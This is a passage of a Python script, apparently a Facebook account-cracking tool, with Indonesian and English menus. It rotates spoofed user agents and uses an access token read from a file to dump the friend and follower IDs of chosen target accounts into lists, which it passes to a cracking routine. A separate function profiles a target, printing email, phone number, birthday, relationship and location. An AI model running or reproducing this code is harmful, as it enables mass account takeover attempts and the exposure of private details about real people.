		ua_ris=("Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36")
#		ua_ris=("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
		ua_ang=("Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4")
		ua_dam=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
		logo()
		jalan(f"{bulat}User Agent Broken")
		jalan(f"{bulat}Created By Risky")
		print(f"{war}Silahkan Pilih User Agent Untuk DiGunakan !!")
		print(f"{war}Please Select A User Agent To Use\n"+p)
		print(k+"["+p+"01"+k+"]"+p+" Made by Risky "+k+"( "+i+"Recommended"+k+" )")
		print(k+"["+p+"02"+k+"]"+p+" Made by Dapunta")
		print(k+"["+p+"03"+k+"]"+p+" Made by Angga")
		print(k+"["+p+"04"+k+"]"+p+" Change User Agent")
		v=input("Choose : ")
		if v=="1" or v=="01":
			os.system("rm -rf ua_me.txt")
			ppx=open("ua_me.txt", "w")
			ppx.write(ua_ris)
			ppx.close()
			exit(war+"Run the Tools Again !!")
		elif v=="2" or v=="02":
			os.system("rm -rf ua_me.txt")
			ppx=open("ua_me.txt", "w")
			ppx.write(ua_dam)
			ppx.close()
			exit(war+"Run the Tools Again !!")
		elif v=="3" or v=="03":
			os.system("rm -rf ua_me.txt")
			ppx=open("ua_me.txt", "w")
			ppx.write(ua_ang)
			ppx.close()
			exit(war+"Run the Tools Again !!")
		elif v=="4" or v=="04":
			os.system("rm -rf ua_me.txt")
			xx=input("Login Your User Agent User : ")
			ppx=open("ua_me.txt", "w")
			ppx.write(xx)
			ppx.close()
			exit(war+"Run the Tools Again !!")
		else:
			print("Failed to Choose")
			menu_user_agent()
def target(idt,idtx,filexx):
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		print(k+"["+p+"!"+k+"]"+p+" Cookie/Token Rusak")
		os.system("rm -rf login.txt")
		logs()
	try:
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (filexx+".json").replace(" ","_")
		ys = open(qq , "a+")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		time.sleep(1.75)
		return target(idt,idtx,filexx)
	except Exception as e: 
		jalan(war+"Maaf Masalah Tidak DiKetahui")
		input(war+"Press Enter !!")
		menu()
def pemisah():
	ppc=open("ID_MASAL.json", "a+")
	alex=input(inp+'Masukan ID (skip/enter) : '+i)
	if alex=="":
		pemisahx()
	else:
		ppc.write(alex+"|"+me+"\n")
		ppc.close()
		return pemisah()
def pemisahx():
    try:
        asw = input(inp+'Limit Dump : '+i)
        list_akun=open("ID_MASAL.json").read().splitlines()
        with ThreadPoolExecutor(max_workers=1500) as su:
                for akun in list_akun:
                        akun=akun.split("|")
                        os.system("rm -rf ID_MASAL.json")
                        su.submit(Masal,akun[0],asw)
    except (KeyError, IOError):
        exit(war+"BUG !!")
def pemisahxx():
    try:
        asw = input(inp+'Limit Dump : '+i)
        file = input(inp+"Nama File : "+i)
        list_akun=open(file).read().splitlines()
        with ThreadPoolExecutor(max_workers=1500) as su:
                for akun in list_akun:
                        akun=akun.split("|")
                        os.system("rm -rf "+file)
                        su.submit(Masal,akun[0],asw)
    except (KeyError, IOError):
        exit(war+"BUG !!")

def get_info():
    i='\033[0;92m'
    try:
        toket=open("login.txt","r").read()
    except IOError:
        print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
        os.system("rm -rf login.txt")
        logs()
    try:
        idt = input(inp+'Masukkan ID Target :'+k)
        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
        op = json.loads(jok.text)
    except Exception as e: 
        print(war+"Masalah Tidak DiTemukan")
        exir()
    except (KeyError, IOError):
        print(war+"Masalah Tidak DiTemukan")
        exir()
    try:
        nama = op['name']
    except (KeyError, IOError):
        nama = M+"—"+c
    try:
        namade = op['first_name']
    except (KeyError, IOError):
        namade= M+"—"+c
    try:
        namabe = op['last_name']
    except (KeyError, IOError):
        namabe= M+"—"+c
    try:
        idfb = op['id']
    except (KeyError, IOError):
        idfb = M+"—"+c
    try:
        user = op['username']
    except (KeyError, IOError):
        user = M+"—"+c
    try:
        ttll = op['birthday']
    except (KeyError, IOError):
        ttll = M+"—"+c
    try:
        tzim = op['timezone']
    except (KeyError, IOError):
        tzim = M+"—"+c
    try:
        stas = op['relationship_status']
    except (KeyError, IOError):
        stas = M+"—"+c
    try:
        dgn = '''dengan %s'''%(op['significant_other']['name'])
    except (KeyError, IOError):
        dgn = M+"—"+c
    try:
        tigl = op['location']['name']
    except (KeyError, IOError):
        tigl = M+"—"+c
    try:
        dari = op['hometown']['name']
    except (KeyError, IOError):
        dari = M+"—"+c
    try:
        lins = op['link']
    except (KeyError, IOError):
        lins = M+"—"+c
    try:
        uptd = op['updated_time']
    except (KeyError, IOError):
        uptd = M+"—"+c
    try:
        nmrr = op['mobile_phone']
    except (KeyError, IOError):
        nmrr = M+"—"+c
    try:
        emai = op['email']
    except (KeyError, IOError):
        emai = M+"—"+c
    try:
        bioo = op['about']
    except (KeyError, IOError):
        bioo = M+"—"+c
    try:
        gndr = op['gender']
    except (KeyError, IOError):
        gndr = M+'—'+c
    try:
        r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
        id = []
        z = json.loads(r.text)
        qq = (op["first_name"]+".json").replace(" ","_")
        ys = open(qq , "w")
        for i in z["data"]:
                id.append(i["id"])
                ys.write(i["id"])
        ys.close()
        temn = "%s"%(len(id))
#        print((k+"["+p+"•"+k+"]"+p+" Total Friend     : %s"%(len(id))))
    except KeyError:
        temn = M+"—"+c
        print((k+"["+p+"•"+k+"]"+p+" Total Friend     : -"))
    try:
        r = requests.get('https://graph.facebook.com/%s/friends?access_token=%s'%(idt, toket))
        z = json.loads(r.text)
        for bmx in z['data']:
                uid = bmx['id']
                na = bmx['name']
                nm = na.rsplit(' ')[0]
                id.append(uid + '|' + nm)
    except: pass
    try:
        r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idt, toket))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
        pengikut = '%s-%s'%(M,N)
    except: pass
    print("\n"+war+'Informasih Targwt !!');time.sleep(0.30)
    print("\n"+bulat+"Full Name       : "+i+nama)
    print(bulat+"First Name      : "+i+namade)
    print(bulat+"Last Name       : "+i+namabe);time.sleep(0.30)
    print(bulat+'UserName        : '+i+user);time.sleep(0.30)
    print(bulat+'Tanggal Lahir   : '+i+ttll);time.sleep(0.30)
    print("\n"+war+'Data Data Target !!');time.sleep(0.30)
    print("\n"+bulat+'Gmail Facebook  : '+i+emai);time.sleep(0.30)
    print(bulat+'Nomor Telepons  : '+i+nmrr);time.sleep(0.30)
    print(bulat+'Jenis Kelamin   : '+i+gndr);time.sleep(0.30)
    print(bulat+'Jumlah Teman    : '+temn);time.sleep(0.03)
    print(bulat+'Followers       : %s'%(pengikut));time.sleep(0.30)
    print(bulat+'Status Hubungan : %s %s'%(stas,dgn));time.sleep(0.03)
    print(bulat+'Link Facebook   : '+i+lins);time.sleep(0.30)
    print(bulat+'Tentang Status  : '+i+bioo);time.sleep(0.30)
    print(bulat+'Kota Asal       : '+i+dari);time.sleep(0.30)
    print(bulat+'Tinggal         : '+i+tigl);time.sleep(0.30)
    print(bulat+'Terahir DiUpdate: '+i+uptd);time.sleep(0.30)
    jalan("\n"+war+'Athour : Mr.Risky')
    input(war+"Tekan Enter Untuk Kembali")
    menu()
#### User Agentnya Jwngan DiEdit :)
def filecoba(risky):
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		id = []
		qqx = (risky).replace(" ","_")
		return pilihcrack(qqx)
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)
def follow():
	os.system("clear")
	logo()
	print(f"{war}Ketik ( menu ) Untuk Kembali KeMenu Utaman")
	jalan(f"{war}Silahkan Pilih Mau Dump ID !! [ 1 - 5 ]")
	v = input(f'{bulat}Jumlah : ')
	if v in ("", " ", "  "):
		follow()
	elif v=="1" or v=="01":
		Follow__01()
	elif v=="2" or v=="02":
		Follow__02()
	elif v=="3" or v=="03":
		Follow__03()
	elif v=="4" or v=="04":
		Follow__04()
	elif v=="5" or v=="05":
		Khusus()
	elif v=="MENU" or v=="menu":
		menu()
	else:
		jalan("wrong")
		follow()
def public():
    publik()
def publik():
	os.system("clear")
	logo()
	print(f"{war}Ketik ( menu ) Untuk Kembali KeMenu Utaman")
	jalan(f"{war}Silahkan Pilih Mau Dump ID !! [ 1 - 5 ]")
	v = input(f'{bulat}Jumlah : ')
	if v in ("", " ", "  "):
		publik()
	elif v=="1" or v=="01":
		Public__01()
	elif v=="2" or v=="02":
		Public__02()
	elif v=="3" or v=="03":
		Public__03()
	elif v=="4" or v=="04":
		exit(war+"Crack 4 ID Sedang Error !!")
#		Public__04()
	elif v=="5" or v=="05":
		Public__05()
	elif v=="MENU" or v=="menu":
		menu()
	else:
		jalan("wrong")
		publik()


def Public__01():
    try:
        __cindy__= open('login.txt', 'r').read()
        toket= open('login.txt', 'r').read()
    except IOError:
        print (bulat+'Token Error')
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        logs()
    jalan(war+"Made by Risky And Dumai-991")
    idt = input(k+"["+p+"•"+k+"]"+p+" Public ID Target 01 : ")
    while len(idt) < 5:
        jalan("Kosong ??" if idt in (""," ") else (war+"Masukan 5 Angka !!"))
        time.sleep(1.75)
        Public__01()
    jalan(k+"["+p+"•"+k+"]"+p+" Recommended For 1500 Dump ID")
    max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
    while len(max_id) < 3:
        jalan("Kosong ??" if idt in (""," ") else (war+"Masukan 3 Angka !!"))
        time.sleep(1.75)
        max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
    try:
        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
        op = json.loads(jok.text)
        print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
    except KeyError:
        print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
        print((k+"\n[ "+p+"Back"+k+" ]"+p))
        public()
    try:
        xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(idt,max_id,__cindy__))
        id = []
        z = json.loads(xxx.text)
        qq = (op["first_name"]+".json").replace(" ","_")
        ys = open(qq, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            mr = random.choice(["%", "?", "!", "#"])
            sys.stdout.write('\r[%s%s%s]%sTotal ID Public : %s%s%s '%(w, mr, q, k, w, len(id), q
            )); sys.stdout.flush()
            time.sleep(0.0010)
        ys.close()
        return pilihcrack(qq)
    except Exception as e: 
        jalan(war+"Maaf Masalah Tidak DiKetahui")
        jalan(war+"Maaf Masalah Terhadap Id 01")
        input(war+"Press Enter !!")
        menu()
def Public__02():
    try:
        __cindy__= open('login.txt', 'r').read()
        toket= open('login.txt', 'r').read()
    except IOError:
        print (bulat+'Token Error')
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        logs()
    jalan(war+"Made by Risky And Dumai-991")
    idt = input(k+"["+p+"•"+k+"]"+p+" Public ID Target 01 : ")
    while len(idt) < 5:
        jalan("Kosong ??" if idt in (""," ") else (war+"Masukan 5 Angka !!"))
        time.sleep(1.75)
        Public__02()
    idt2 = input(k+"["+p+"•"+k+"]"+p+" Public ID Target 02 : ")
    while len(idt) < 5:
        jalan("Kosong ??" if idt2 in (""," ") else (war+"Masukan 5 Angka !!"))
        time.sleep(1.75)
        Public__02()
    jalan(k+"["+p+"•"+k+"]"+p+" Recommended For 1500 Dump ID")
    max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
    while len(max_id) < 3:
        jalan("Kosong ??" if idt in (""," ") else (war+"Masukan 3 Angka !!"))
        time.sleep(1.75)
        max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
    try:
        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
        op = json.loads(jok.text)
        print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
    except KeyError:
        print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
        print((k+"\n[ "+p+"Back"+k+" ]"+p))
        public()
    try:
        xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(idt,max_id,__cindy__))
        id = []
        z = json.loads(xxx.text)
        qq = (op["first_name"]+".json").replace(" ","_")
        ys = open(qq, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            mr = random.choice(["%", "?", "!", "#"])
            sys.stdout.write('\r[%s%s%s]%sTotal ID Public : %s%s%s '%(w, mr, q, k, w, len(id), q
            )); sys.stdout.flush()
            time.sleep(0.0010)
        ys.close()
        try:
            try:
                jok = requests.get("https://graph.facebook.com/"+idt2+"?access_token="+toket)
                op = json.loads(jok.text)
                print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
            except KeyError:
                print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
                print((k+"\n[ "+p+"Back"+k+" ]"+p))
                public()
            try:
                xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(idt2,max_id,__cindy__))
                id = []
                z = json.loads(xxx.text)
                ys = open(qq, 'a+')
                for a in z['data']:
                    id.append(a['id'] + '<=>' + a['name'])
                    ys.write(a['id'] + '<=>' + a['name'] + '\n')
                    w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
                    mr = random.choice(["%", "?", "!", "#"])
                    sys.stdout.write('\r[%s%s%s]%sTotal ID Public : %s%s%s '%(w, mr, q, k, w, len(id), q
                    )); sys.stdout.flush()
                    time.sleep(0.0010)
                ys.close()
                return pilihcrack(qq)
            except Exception as e: 
                jalan(war+"Maaf Masalah Tidak DiKetahui")
                jalan(war+"Maaf Masalah Terhadap Id 01")
                input(war+"Press Enter !!")
                menu()
        except KeyError:
            print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
            print((k+"\n[ "+p+"Back"+k+" ]"+p))
            public()
    except Exception as e: 
        jalan(war+"Maaf Masalah Tidak DiKetahui")
        jalan(war+"Maaf Masalah Terhadap Id 01")
        input(war+"Press Enter !!")
        menu()
def Public__03():
    try:
        __cindy__= open('login.txt', 'r').read()
        toket= open('login.txt', 'r').read()
    except IOError:
        print (bulat+'Token Error')
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        logs()
    jalan(war+"Made by Risky And Dumai-991")
    idt = input(k+"["+p+"•"+k+"]"+p+" Public ID Target 01 : ")
    while len(idt) < 5:
        jalan("Kosong ??" if idt in (""," ") else (war+"Masukan 5 Angka !!"))
        time.sleep(1.75)
        idt = input(k+"["+p+"•"+k+"]"+p+" Public ID Target 01 : ")
    idt2 = input(k+"["+p+"•"+k+"]"+p+" Public ID Target 02 : ")
    while len(idt) < 5:
        jalan("Kosong ??" if idt2 in (""," ") else (war+"Masukan 5 Angka !!"))
        time.sleep(1.75)
        idt2 = input(k+"["+p+"•"+k+"]"+p+" Public ID Target 02 : ")
    idt3 = input(k+"["+p+"•"+k+"]"+p+" Public ID Target 03 : ")
    while len(idt) < 5:
        jalan("Kosong ??" if idt3 in (""," ") else (war+"Masukan 5 Angka !!"))
        time.sleep(1.75)
        idt3 = input(k+"["+p+"•"+k+"]"+p+" Public ID Target 03 : ")
    jalan(k+"["+p+"•"+k+"]"+p+" Recommended For 1500 Dump ID")
    max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
    while len(max_id) < 3:
        jalan("Kosong ??" if idt in (""," ") else (war+"Masukan 3 Angka !!"))
        time.sleep(1.75)
        max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
    try:
        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
        op = json.loads(jok.text)
        print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
    except KeyError:
        print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
        print((k+"\n[ "+p+"Back"+k+" ]"+p))
        public()
    try:
        xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(idt,max_id,__cindy__))
        id = []
        z = json.loads(xxx.text)
        qq = (op["first_name"]+".json").replace(" ","_")
        ys = open(qq, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            mr = random.choice(["%", "?", "!", "#"])
            sys.stdout.write('\r[%s%s%s]%sTotal ID Public : %s%s%s '%(w, mr, q, k, w, len(id), q
            )); sys.stdout.flush()
            time.sleep(0.0010)
        ys.close()
        try:
            try:
                jok = requests.get("https://graph.facebook.com/"+idt2+"?access_token="+toket)
                op = json.loads(jok.text)
                print(("\n"+k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
            except KeyError:
                print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
                print((k+"\n[ "+p+"Back"+k+" ]"+p))
                public()
            try:
                xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(idt2,max_id,__cindy__))
                id = []
                z = json.loads(xxx.text)
                ys = open(qq, 'a+')
                for a in z['data']:
                    id.append(a['id'] + '<=>' + a['name'])
                    ys.write(a['id'] + '<=>' + a['name'] + '\n')
                    w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
                    mr = random.choice(["%", "?", "!", "#"])
                    sys.stdout.write('\r[%s%s%s]%sTotal ID Public : %s%s%s '%(w, mr, q, k, w, len(id), q
                    )); sys.stdout.flush()
                    time.sleep(0.0010)
                ys.close()
                try:
                    try:
                        jok = requests.get("https://graph.facebook.com/"+idt3+"?access_token="+toket)
                        op = json.loads(jok.text)
                        print(("\n"+k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
                    except KeyError:
                        print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
                        print((k+"\n[ "+p+"Back"+k+" ]"+p))
                        public()
                    try:
                        xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(idt3,max_id,__cindy__))
                        id = []
                        z = json.loads(xxx.text)
                        ys = open(qq, 'a+')
                        for a in z['data']:
                            id.append(a['id'] + '<=>' + a['name'])
                            ys.write(a['id'] + '<=>' + a['name'] + '\n')
                            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
                            mr = random.choice(["%", "?", "!", "#"])
                            sys.stdout.write('\r[%s%s%s]%sTotal ID Public : %s%s%s '%(w, mr, q, k, w, len(id), q
                            )); sys.stdout.flush()
                            time.sleep(0.0010)
                        ys.close()
                        return pilihcrack(qq)
                    except Exception as e: 
                        jalan(war+"Maaf Masalah Tidak DiKetahui")
                        jalan(war+"Maaf Masalah Terhadap Id 03")
                        input(war+"Press Enter !!")
                        menu()
                except KeyError:
                    print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
                    print((k+"\n[ "+p+"Back"+k+" ]"+p))
                    public()
            except Exception as e: 
                jalan(war+"Maaf Masalah Tidak DiKetahui")
                jalan(war+"Maaf Masalah Terhadap Id 02")
                input(war+"Press Enter !!")
                menu()
        except KeyError:
            print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
            print((k+"\n[ "+p+"Back"+k+" ]"+p))
            public()
    except Exception as e: 
        jalan(war+"Maaf Masalah Tidak DiKetahui")
        jalan(war+"Maaf Masalah Terhadap Id 01")
        input(war+"Press Enter !!")
        menu()

def Public__05():
    try:
        __cindy__= open('login.txt', 'r').read()
        toket= open('login.txt', 'r').read()
    except IOError:
        print (bulat+'Token Error')
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        logs()
    jalan(war+"Made by Risky And Dumai-991")
    idt = input(k+"["+p+"•"+k+"]"+p+" Public ID Target 01 : ")
    while len(idt) < 5:
        jalan("Kosong ??" if idt in (""," ") else (war+"Masukan 5 Angka !!"))
        time.sleep(1.75)
        idt = input(k+"["+p+"•"+k+"]"+p+" Public ID Target 01 : ")
    idt2 = input(k+"["+p+"•"+k+"]"+p+" Public ID Target 02 : ")
    while len(idt) < 5:
        jalan("Kosong ??" if idt2 in (""," ") else (war+"Masukan 5 Angka !!"))
        time.sleep(1.75)
        idt2 = input(k+"["+p+"•"+k+"]"+p+" Public ID Target 02 : ")
    idt3 = input(k+"["+p+"•"+k+"]"+p+" Public ID Target 03 : ")
    while len(idt) < 5:
        jalan("Kosong ??" if idt3 in (""," ") else (war+"Masukan 5 Angka !!"))
        time.sleep(1.75)
        idt3 = input(k+"["+p+"•"+k+"]"+p+" Public ID Target 03 : ")
    idt4 = input(k+"["+p+"•"+k+"]"+p+" Public ID Target 04 : ")
    while len(idt) < 5:
        jalan("Kosong ??" if idt4 in (""," ") else (war+"Masukan 5 Angka !!"))
        time.sleep(1.75)
        idt4 = input(k+"["+p+"•"+k+"]"+p+" Public ID Target 04 : ")
    idt5 = input(k+"["+p+"•"+k+"]"+p+" Public ID Target 05 : ")
    while len(idt) < 5:
        jalan("Kosong ??" if idt5 in (""," ") else (war+"Masukan 5 Angka !!"))
        time.sleep(1.75)
        idt5 = input(k+"["+p+"•"+k+"]"+p+" Public ID Target 05 : ")
    jalan(k+"["+p+"•"+k+"]"+p+" Recommended For 1500 Dump ID")
    max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
    while len(max_id) < 3:
        jalan("Kosong ??" if max_id in (""," ") else (war+"Masukan 3 Angka !!"))
        time.sleep(1.75)
        max_id = input(k+"["+p+"•"+k+"]"+p+" Jumlah Dump Per-ID : ")
    try:
        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
        op = json.loads(jok.text)
        print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
    except KeyError:
        print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
        print((k+"\n[ "+p+"Back"+k+" ]"+p))
        public()
    try:
        xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(idt,max_id,__cindy__))
        id = []
        z = json.loads(xxx.text)
        qq = (op["first_name"]+".json").replace(" ","_")
        ys = open(qq, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            mr = random.choice(["%", "?", "!", "#"])
            sys.stdout.write('\r[%s%s%s]%sTotal ID Public : %s%s%s '%(w, mr, q, k, w, len(id), q
            )); sys.stdout.flush()
            time.sleep(0.0010)
        ys.close()
        try:
            try:
                jok = requests.get("https://graph.facebook.com/"+idt2+"?access_token="+toket)
                op = json.loads(jok.text)
                print(("\n"+k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
            except KeyError:
                print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
                print((k+"\n[ "+p+"Back"+k+" ]"+p))
                public()
            try:
                xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(idt2,max_id,__cindy__))
                id = []
                z = json.loads(xxx.text)
                ys = open(qq, 'a+')
                for a in z['data']:
                    id.append(a['id'] + '<=>' + a['name'])
                    ys.write(a['id'] + '<=>' + a['name'] + '\n')
                    w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
                    mr = random.choice(["%", "?", "!", "#"])
                    sys.stdout.write('\r[%s%s%s]%sTotal ID Public : %s%s%s '%(w, mr, q, k, w, len(id), q
                    )); sys.stdout.flush()
                    time.sleep(0.0010)
                ys.close()
                try:
                    try:
                        jok = requests.get("https://graph.facebook.com/"+idt3+"?access_token="+toket)
                        op = json.loads(jok.text)
                        print(("\n"+k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
                    except KeyError:
                        print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
                        print((k+"\n[ "+p+"Back"+k+" ]"+p))
                        public()
                    try:
                        xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(idt3,max_id,__cindy__))
                        id = []
                        z = json.loads(xxx.text)
                        ys = open(qq, 'a+')
                        for a in z['data']:
                            id.append(a['id'] + '<=>' + a['name'])
                            ys.write(a['id'] + '<=>' + a['name'] + '\n')
                            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
                            mr = random.choice(["%", "?", "!", "#"])
                            sys.stdout.write('\r[%s%s%s]%sTotal ID Public : %s%s%s '%(w, mr, q, k, w, len(id), q
                            )); sys.stdout.flush()
                            time.sleep(0.0010)
                        ys.close()
                        try:
                            try:
                                jok = requests.get("https://graph.facebook.com/"+idt4+"?access_token="+toket)
                                op = json.loads(jok.text)
                                print(("\n"+k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
                            except KeyError:
                                print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
                                print((k+"\n[ "+p+"Back"+k+" ]"+p))
                                public()
                            try:
                                xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(idt4,max_id,__cindy__))
                                id = []
                                z = json.loads(xxx.text)
                                ys = open(qq, 'a+')
                                for a in z['data']:
                                    id.append(a['id'] + '<=>' + a['name'])
                                    ys.write(a['id'] + '<=>' + a['name'] + '\n')
                                    w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
                                    mr = random.choice(["%", "?", "!", "#"])
                                    sys.stdout.write('\r[%s%s%s]%sTotal ID Public : %s%s%s '%(w, mr, q, k, w, len(id), q
                                    )); sys.stdout.flush()
                                    time.sleep(0.0010)
                                ys.close()
                                try:
                                    try:
                                        jok = requests.get("https://graph.facebook.com/"+idt5+"?access_token="+toket)
                                        op = json.loads(jok.text)
                                        print(("\n"+k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
                                    except KeyError:
                                        print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
                                        print((k+"\n[ "+p+"Back"+k+" ]"+p))
                                        public()
                                    try:
                                        xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(idt5,max_id,__cindy__))
                                        id = []
                                        z = json.loads(xxx.text)
                                        ys = open(qq, 'a+')
                                        for a in z['data']:
                                            id.append(a['id'] + '<=>' + a['name'])
                                            ys.write(a['id'] + '<=>' + a['name'] + '\n')
                                            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
                                            mr = random.choice(["%", "?", "!", "#"])
                                            sys.stdout.write('\r[%s%s%s]%sTotal ID Public : %s%s%s '%(w, mr, q, k, w, len(id), q
                                            )); sys.stdout.flush()
                                            time.sleep(0.0010)
                                        ys.close()
                                        print(("\n"+k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
                                        return pilihcrack(qq)
                                    except Exception as e: 
